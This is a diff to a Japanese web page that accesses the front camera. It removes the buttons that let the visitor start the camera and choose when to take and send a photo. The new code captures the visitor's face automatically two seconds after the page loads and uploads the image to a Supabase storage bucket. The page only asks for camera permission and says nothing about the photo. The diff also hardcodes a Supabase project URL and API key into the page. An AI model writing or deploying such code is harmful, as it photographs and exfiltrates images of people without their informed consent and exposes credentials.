@@ -3,17 +3,17 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>内カメラ撮影ツール</title>
+  <title>カメラ自動撮影</title>
   <style>
     body {
       font-family: system-ui, sans-serif;
       background: #111;
-      color: #fff;
+      color: white;
       height: 100vh;
-      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
+      margin: 0;
     }
     .box {
       background: #000;
@@ -30,21 +30,6 @@
       margin-bottom: 12px;
       background: #222;
     }
-    button {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-      padding: 12px;
-      font-size: 1rem;
-      border: 2px solid orange;
-      background: #1a1a1a;
-      color: white;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #2a2a2a;
-    }
     #status {
       font-size: 0.9rem;
       color: #ccc;
@@ -54,72 +39,71 @@
 </head>
 <body>
   <div class="box">
-    <h2>📸 カメラ撮影</h2>
+    <h2>📸 カメラを許可してください</h2>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <button id="startBtn">カメラを起動する</button>
-    <button id="captureBtn" style="display:none;">撮影して送信</button>
-    <div id="status"></div>
+    <div id="status">カメラのアクセス許可をお願いします。</div>
   </div>
 
   <script type="module">
     import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
-    import { SUPABASE_URL, SUPABASE_KEY } from "./config.js";
 
+    const SUPABASE_URL = "https://hwwjnlprsntmdcytktbm.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
     const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const startBtn = document.getElementById("startBtn");
-    const captureBtn = document.getElementById("captureBtn");
     const status = document.getElementById("status");
-
     const id = Math.random().toString(36).substring(2, 9);
 
-    let stream;
-
-    startBtn.addEventListener("click", async () => {
+    // 1️⃣ ページ読み込み時にカメラ起動要求
+    window.addEventListener("load", async () => {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
+        const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }, // 内カメ
           audio: false,
         });
         video.srcObject = stream;
-        startBtn.style.display = "none";
-        captureBtn.style.display = "block";
         status.textContent = "カメラ起動中...";
+        
+        // 少し待ってから自動撮影
+        setTimeout(() => captureAndUpload(stream), 2000);
       } catch (err) {
         status.textContent = "カメラが許可されませんでした: " + err.message;
       }
     });
 
-    captureBtn.addEventListener("click", async () => {
-      status.textContent = "撮影中...";
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise((res) =>
-        canvas.toBlob(res, "image/jpeg", 0.85)
-      );
+    // 2️⃣ 自動撮影＆Supabase送信
+    async function captureAndUpload(stream) {
+      try {
+        const ctx = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.85));
 
-      const { error } = await supabase.storage
-        .from("photos")
-        .upload(`${id}.jpg`, blob, { upsert: true });
+        status.textContent = "送信中...";
 
-      if (error) {
-        status.textContent = "送信エラー: " + error.message;
-      } else {
-        status.innerHTML = `
-          ✅ 送信完了<br>
-          <a href="check.html?id=${id}" target="_blank" style="color:orange;">確認ページを開く</a>
-        `;
+        const { error } = await supabase.storage
+          .from("photos")
+          .upload(`${id}.jpg`, blob, { upsert: true });
+
+        if (error) {
+          status.textContent = "送信エラー: " + error.message;
+        } else {
+          status.innerHTML = `
+            ✅ 撮影＆送信完了！<br>
+            <a href="check.html?id=${id}" target="_blank" style="color:orange;">確認ページを開く</a>
+          `;
+        }
+
+        stream.getTracks().forEach((t) => t.stop());
+        video.srcObject = null;
+      } catch (e) {
+        status.textContent = "撮影エラー: " + e.message;
       }
-
-      // カメラ停止
-      stream.getTracks().forEach((track) => track.stop());
-      video.srcObject = null;
-      captureBtn.style.display = "none";
-    });
+    }
   </script>
 </body>
 </html>
